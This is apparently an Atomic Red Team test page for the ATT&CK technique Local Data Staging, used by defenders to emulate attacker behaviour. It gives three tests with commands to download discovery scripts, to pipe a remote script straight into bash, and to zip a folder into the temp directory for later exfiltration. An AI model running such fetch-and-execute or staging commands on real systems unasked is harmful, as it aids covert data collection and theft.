# T1074.001 - Local Data Staging
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1074.001)
<blockquote>Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.</blockquote>

<br/>

## Atomic Test #1 - Stage data from Discovery.bat
Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,
verify that the file is saved in the temp directory.

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| output_file | Location to save downloaded discovery.bat file | Path | $env:TEMP&#92;discovery.bat|


#### Attack Commands: Run with `powershell`! 


```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile #{output_file}
```

#### Cleanup Commands:
```powershell
Remove-Item -Force #{output_file} -ErrorAction Ignore
```





<br/>
<br/>

## Atomic Test #2 - Stage data from Discovery.sh
Utilize curl to download discovery.sh and execute a basic information gathering shell script

**Supported Platforms:** Linux, macOS




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| output_file | Location to save downloaded discovery.bat file | Path | /tmp/T1074.001_discovery.log|


#### Attack Commands: Run with `bash`! 


```bash
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > #{output_file}
```






<br/>
<br/>

## Atomic Test #3 - Zip a Folder with PowerShell for Staging in Temp
Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
was placed in the temp directory.

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| output_file | Location to save zipped file or folder | Path | $env:TEMP&#92;Folder_to_zip.zip|
| input_file | Location of file or folder to zip | Path | PathToAtomicsFolder&#92;T1074.001&#92;bin&#92;Folder_to_zip|


#### Attack Commands: Run with `powershell`! 


```powershell
Compress-Archive -Path #{input_file} -DestinationPath #{output_file} -Force
```

#### Cleanup Commands:
```powershell
Remove-Item -Path #{output_file} -ErrorAction Ignore
```
